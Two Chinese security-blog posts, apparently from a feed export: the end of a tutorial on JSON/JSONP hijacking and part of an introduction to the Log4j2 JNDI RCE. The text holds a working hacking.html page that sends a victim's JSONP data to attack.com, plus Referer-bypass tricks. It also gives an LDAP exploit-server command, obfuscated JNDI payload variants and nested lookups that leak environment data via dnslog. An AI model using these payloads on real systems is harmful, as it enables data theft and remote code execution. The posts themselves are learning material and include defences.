title="json劫持"></a>json劫持</h4><p>JSON劫持即JSON Hijacking，攻击过程类似CSRF，区别在于CSRF只管发送表单请求，但是JSON劫持则是获取JSON格式的敏感数据。</p><p>通常，有些Web应用会把一些敏感数据以JSON形式返回到前端，如果仅仅通过cookie来判断请求是否合法，那么就可以利用类似CSRF的手段，向目标服务器发送请求，以获得敏感数据。</p><p>当JSON数据响应给网站时，浏览器立即会调用数组或者对象的构造函数。正是利用这一点，把构造方法替换成恶意代码，在构造方法中添加将JSON数据发送给第三方即攻击者的代码。</p><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>比如目标站点存在可直接访问JSON数据，其可通过GET请求如<code>www.good.com/user/mail.json</code>来进行访问，同时这个请求没有对用户的身份进行严格的认证，那么当用户访问一个恶意站点的时候，恶意站点同样包含获取<code>www.good.com/user/mail.json</code>的GET请求，再通过JSON劫持的方式就可以获取到用户的敏感JSON数据，然后发送到恶意的站点。</p><p><img src="https://www.mi1k7ea.com/2019/08/20/JSONP%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/8.png" alt="img"></p><p>关键的步骤是第4步和第7步。当用户访问恶意站点之后，从正常站点将JSON数据下载下来之后，如何发送到恶意站点上去。</p><p>这里，我们的恶意页面仅仅是通过script标签的src属性进行导入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;www.good.com/data.json&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>新建data.json文件如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;fname&quot;</span><span class="punctuation">:</span><span class="string">&quot;h0ld1rs&quot;</span><span class="punctuation">,</span><span class="attr">&quot;lname&quot;</span><span class="punctuation">:</span><span class="string">&quot;yanmie&quot;</span><span class="punctuation">,</span><span class="attr">&quot;phone&quot;</span><span class="punctuation">:</span><span class="string">&quot;666666&quot;</span><span class="punctuation">,</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;Wum1ng@163.com&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>当用户在已登录目标站点并保持着Cookie有效的情况下，被诱使访问了我们的恶意页面，就会导致请求目标敏感JSON文件。</p><p>JSON数据从服务器端到达浏览器之后，会被浏览器解析为JavaScript中的Object的实例。在这种情况下，只要重写Object类的set方法，就可以获取到想要的数据，这就是JSON劫持的实现，以下就是攻击代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;<span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>,<span class="string">&quot;email&quot;</span>,&#123;    <span class="attr">set</span>:<span class="keyword">function</span>(<span class="params">obj</span>) &#123;        <span class="comment">// send data to www.bad.com        senddata2badsute(obj)    &#125;&#125;);&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;www.good.com/data.json&quot;/&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>我们为Object类的email属性设置一个Hook函数。在JavaScript中所有的类都是继承至Object类，所以defineProperty()这个方法为所有的对象的email属性都增加了一个Hook函数。当有对象设置email属性的时候，就会运行上面这段代码。所以当浏览器获取到了json数据，要将json数据转化为JavaScript对象的时候，由于json数据中存在email属性的设置，此时就会触发Hook函数，而这个函数就会将数据传送到攻击者。这个过程就完成了json数据的劫持了。</p><p>PS:目前网络上关于这方面的资料大部分都是2012年之前的，此时尝试进行重新的时候，发现已经无法实现了。<strong>说明浏览器目前已经修复了这个漏洞</strong>。关于hook对象的属性设置目前的实现方法与之前的方法也相同了。</p></blockquote><p>我们本地试下就知道了，当我们通过.属性的方式赋值时是会弹框的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;<span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>,<span class="string">&quot;Id&quot;</span>,&#123;    <span class="attr">set</span>:<span class="keyword">function</span>(<span class="params">obj</span>) &#123;        <span class="title function_">alert</span>(obj);    &#125;&#125;);&lt;<span class="regexp">/script&gt;&lt;script&gt;var a = new Object();a.Id = 666;&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207213324.png"></p><p>但是如果我们是直接声明并且赋值给一个对象，这个时候就不会触发这个事件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;<span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>,<span class="string">&quot;Id&quot;</span>,&#123;    <span class="attr">set</span>:<span class="keyword">function</span>(<span class="params">obj</span>) &#123;        <span class="title function_">alert</span>(obj);    &#125;&#125;);&lt;<span class="regexp">/script&gt;&lt;script&gt;var b=&#123;&quot;Id&quot;:123&#125;;&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><p>(，，因为没反应，所以就不截图了)</p><p>而由目标JSON端点返回的数据都是{‘a’:’b’}的形式，&#x3D;&#x3D;即我们恶意页面接收到JSON数据时在script标签是通过直接声明并且赋值的形式来赋值给对象的，从而也不会导致弹框。换句话说，就是现在的浏览器已经对这种JSON劫持漏洞进行了防御，我们没有办法通过Hook JS函数来实现JSON劫持了。&#x3D;&#x3D;</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>当用户在已登录目标站点并保持着Cookie有效的情况下，被诱使访问了我们的恶意页面，而恶意页面是向目标JSON文件发起请求并获取响应；</p><p>因为script标签会自动解析请求回来的JSON数据并生成对应的JS对象，此时我们只需要再通过<code>Object.prototype.__defineSetter__</code>这个函数来进行Hook，就能实现将获取到的JSON数据往外发送给攻击者，从而成功导致JSON劫持；</p><p>但是该函数在当前的新版本chrome和firefox中都已经失效了，浏览器早已对此JSON劫持漏洞进行了修补</p><h4 id="JSONP劫持-1"><a href="#JSONP劫持-1" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h4><p>前面JSON劫持的通用方法其实已经早已被浏览器防御住了，但由于JSONP的出现，导致JSON劫持多了一种JSONP的形式，这是因为JSONP数据其实就是往JS函数中传参进行调用，这就导致了攻击者在恶意页面编写恶意的JS函数，通过JSONP的调用来执行该恶意JS函数、将敏感JSONP数据发往攻击者服务器中。</p><h5 id="Demo0"><a href="#Demo0" class="headerlink" title="Demo0"></a>Demo0</h5><p>这里我们模拟一个登录站点，登录后可与JSONP端点交互获取用户信息；而攻击者则是在自己服务器放置恶意HTML文件来尝试劫持用户JSONP数据。</p><p>main.php，放置于目标站点，用于用户登录以及与JSONP端点交互获取用户信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>error_reporting(<span class="number">0</span>);<span class="title function_ invoke__">session_start</span>();<span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];<span class="variable">$pwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pwd&#x27;</span>];<span class="keyword">if</span>(<span class="variable">$name</span>===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$pwd</span> === <span class="string">&#x27;admin&#x27;</span> || <span class="variable">$name</span>===<span class="string">&#x27;guest&#x27;</span> &amp;&amp; <span class="variable">$pwd</span> === <span class="string">&#x27;guest&#x27;</span>)&#123;<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$name</span>;&#125;<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;logout&#x27;</span>])) &#123;<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;logout&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>) &#123;<span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]);&#125;&#125;<span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;http://192.168.68.130/info.php?callback=jsonp&quot;&gt;用户信息&lt;/a&gt;&lt;br&gt;&#x27;</span>;<span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;http://192.168.68.130/main.php?logout=1&quot;&gt;退出登录&lt;/a&gt;&lt;br data-tomark-pass&gt;&#x27;</span>;<span class="keyword">if</span>(!<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>])&#123;<span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;登录&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;main.php&quot; method=&quot;get&quot;&gt;用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;密码：&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;login&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;&#125;<span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;欢迎您, &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;&lt;br data-tomark-pass&gt;&quot;</span>;&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>info.php，放置于目标服务器中，JSONP端点，用于提供指定用户的信息，注意这里设置了Content-Type为application&#x2F;json，防御了JSONP XSS漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="title function_ invoke__">session_start</span>();<span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;(&#123;&#x27;id&#x27;:1,&#x27;name&#x27;:&#x27;admin&#x27;&#125;)&quot;</span>;&#125; <span class="keyword">elseif</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;guest&#x27;</span>) &#123;        <span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;(&#123;&#x27;id&#x27;:2,&#x27;name&#x27;:&#x27;guest&#x27;&#125;)&quot;</span>;&#125; <span class="keyword">else</span> &#123;        <span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;获取个人信息失败&quot;</span>;&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hacking.html，放置在攻击者服务器中，用于诱使受害者访问，以窃取目标站点JSONP端点的敏感信息并发往攻击者服务器中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>lol<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">jsonp_hack</span>(<span class="params">v</span>)&#123;<span class="title function_">alert</span>(<span class="string">&quot;JSONP hacking&quot;</span>);<span class="keyword">var</span> h = <span class="string">&#x27;&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> v)&#123;<span class="keyword">var</span> a = <span class="string">&#x27;&#x27;</span>;a = key + <span class="string">&#x27; : &#x27;</span> + v[key] + <span class="string">&#x27; ,&#x27;</span>;h += a;&#125;<span class="title function_">alert</span>(h);$.<span class="title function_">get</span>(<span class="string">&#x27;http://attack.com/index.html?value=&#x27;</span>+h);&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.68.130/info.php?callback=jsonp_hack&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者还是可以收到</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207215734.png"></p><p>这是发送方的</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207215847.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207215927.png"></p><h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><ul><li><h4 id="Referer绕过"><a href="#Referer绕过" class="headerlink" title="Referer绕过"></a>Referer绕过</h4><p>有时候程序对Referer进行了校验，但并未对空Referer进行校验，此时我们就可以使用置空的Referer请求来绕过。    </p><ul><li>实现空refer有三种方法</li><li>使用iframe标签+javascript伪协议</li><li>从HTTPS向HTTP发起请求</li><li>使用meta标签</li></ul></li><li><p><strong>使用iframe标签+javascript伪协议</strong></p><p>原理就是在恶意HTML中，给iframe标签的src属性赋值为javascript:&#x2F;&#x2F;伪协议内容，其中具体内容为和之前一样的定义两个script标签、一个定义callback函数具体操作、另一个则是通过script标签的src属性向目标JSONP端点发起跨域请求。</p></li></ul><h2 id="0x03防御"><a href="#0x03防御" class="headerlink" title="0x03防御"></a>0x03防御</h2><ul><li>若可行，则使用CORS替换JSONP实现跨域功能；</li><li>应用CSRF防御措施来调用JSON文件：限制Referer 、部署Token等；</li><li>严格设置Content-Type及编码（Content-Type: application&#x2F;json; charset&#x3D;utf-8 ）；</li><li>严格过滤 callback 函数名及JSON里数据的输出；</li><li>严格限制对JSONP输出callback函数名的长度（如防御Flash输出的方法）</li></ul><h2 id="0x04-实际应用场景"><a href="#0x04-实际应用场景" class="headerlink" title="0x04 实际应用场景"></a>0x04 实际应用场景</h2><p>这篇文章介绍了JSON Hijacking钓鱼</p><p><a href="https://www.freebuf.com/articles/web/194698.html">https://www.freebuf.com/articles/web/194698.html</a></p><p>所以，jsonp需要验证refer，我们平时挖洞的时候，只要满足这4点，（其实xray就可以挖了）</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207220824.png"></p><p>对于xray扫出来，可以自己再验证一下，或者自己手工挖掘。</p><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><p><a href="https://www.mi1k7ea.com/2019/08/20/JSONP%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#JSON%E5%8A%AB%E6%8C%81">https://www.mi1k7ea.com/2019/08/20/JSONP%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#JSON%E5%8A%AB%E6%8C%81</a></p><p><a href="https://www.freebuf.com/articles/web/194698.html">https://www.freebuf.com/articles/web/194698.html</a></p><p>《推开xray之门》</p>]]></content>
    
    
    <summary type="html">对jsonp学习的一些描述记录</summary>
    
    
    
    <category term="漏洞" scheme="https://h0ld1rs.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="漏洞" scheme="https://h0ld1rs.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Log4j2分析入门</title>
    <link href="https://h0ld1rs.github.io/posts/51438.html"/>
    <id>https://h0ld1rs.github.io/posts/51438.html</id>
    <published>2022-03-18T03:36:55.000Z</published>
    <updated>2022-03-18T03:38:47.876Z</updated>
    
    <content type="html"><![CDATA[<h1 id="log4j-RCE入门"><a href="#log4j-RCE入门" class="headerlink" title="log4j RCE入门"></a>log4j RCE入门</h1><p>首先需要了解一下log4j的依赖包，使用jar包暂且不说，如果是maven项目导入的话，需要导入两个包</p><p><code>log4j</code>和<code>log4j-api</code></p><blockquote><p>log4j 包含.class<br>log4j-api 包含.class但是只是一堆接口而已，实际使用需要log4j<br>log4j-core 包含.class与.java也就是源码</p></blockquote><p>两者缺一不可，其他的东西可以自己去了解一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>我们先看代码</p><p>这里使用的版本是 jdk8u181</p><p>首先，需要开启ldap服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalec.jndi.LDAPRefServer http:<span class="comment">//127.0.0.1:8000/#Exp</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4jRce</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger= LogManager.getLogger(log4jRce.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;jndi:ldap://127.0.0.1:1389/Exp&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>操作调试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">lookup:<span class="number">55</span>, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:<span class="number">221</span>, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:<span class="number">1110</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">1033</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">912</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:<span class="number">467</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:<span class="number">132</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:<span class="number">38</span>, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:<span class="number">344</span>, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:<span class="number">244</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">229</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">59</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:<span class="number">197</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:<span class="number">190</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:<span class="number">181</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:<span class="number">156</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:<span class="number">129</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:<span class="number">120</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:<span class="number">84</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:<span class="number">540</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:<span class="number">498</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">481</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">456</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">63</span>, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">161</span>, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:<span class="number">2205</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:<span class="number">2159</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:<span class="number">2142</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:<span class="number">2017</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:<span class="number">1983</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">error:<span class="number">740</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:<span class="number">7</span>, log4jRce</span><br></pre></td></tr></table></figure><h2 id="变种-payload"><a href="#变种-payload" class="headerlink" title="变种 payload"></a>变种 payload</h2><p>会对<code>payload</code>进行一个递归的处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;:<span class="comment">//127.0.0.1:1099/ass&#125;</span></span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi:<span class="comment">//127.0.0.1:1099/ass&#125;</span></span><br><span class="line">$&#123;jndi:rmi:<span class="comment">//adsasd.asdasd.asdasd&#125;</span></span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;:<span class="comment">//adsasd.asdasd.asdasd/poc&#125;</span></span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;:<span class="comment">//adsasd.asdasd.asdasd/poc&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;:<span class="comment">//adsasd.asdasd.asdasd/poc&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;:<span class="comment">//xxxxxxx.xx/poc&#125;</span></span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><code>ElasticSearch</code>利用<code>Java</code>的<code>SecurityManager</code>安全机制来防御文件操作和<code>Socket</code>操作，所以无法正常连接远程服务器</p><p>这种不能<code>RCE</code>的情况也说明了，研究<code>log4j2非RCE</code>的必要性，看看是否能信息泄露</p><p>解决：</p><ul><li>获取：利用<code>$&#123;&#125;</code>和其他各种<code>Lookup</code></li><li>带出：利用<code>dnslog</code>或直接<code>dns</code>协议</li></ul><h3 id="1-嵌套标签"><a href="#1-嵌套标签" class="headerlink" title="1. 嵌套标签"></a>1. 嵌套标签</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//$&#123;java:version&#125;.u2xf5m.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><p><code>Log4j2</code>是在<code>substitute</code>方法中递归解析<code>$&#123;&#125;</code>表达式，所以可以利用这种嵌套标签，从内到外获取<code>$&#123;&#125;</code>中的内容，然后分配给对应的<code>Lookup</code>做解析，获得信息后通过<code>Dnslog</code>带出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4jRce</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger= LogManager.getLogger(log4jRce.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://$&#123;env:OS&#125;.12qtuf.dnslog.cn&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\12451\AppData\Roaming\Typora\typora-user-images\image-20220317171103439.png" alt="image-20220317171103439"></p><p>在其中试一些 payload 的时候：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//$&#123;java:version&#125;.u2xf5m.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure><p>是无法执行通的，这里不知道是为什么，希望一些师傅能解答</p><h3 id="2-Sys与Env"><a href="#2-Sys与Env" class="headerlink" title="2.Sys与Env"></a>2.Sys与Env</h3><p>信息来自于<code>System.getProperty()</code>和<code>System.getenv()</code></p><p>参考这个师傅的：<a href="https://github.com/jas502n/Log4j2-CVE-2021-44228">https://github.com/jas502n/Log4j2-CVE-2021-44228</a></p><p>师傅针对不同版本做出了一些例子</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220317171452.png"></p><h3 id="3-Bundle"><a href="#3-Bundle" class="headerlink" 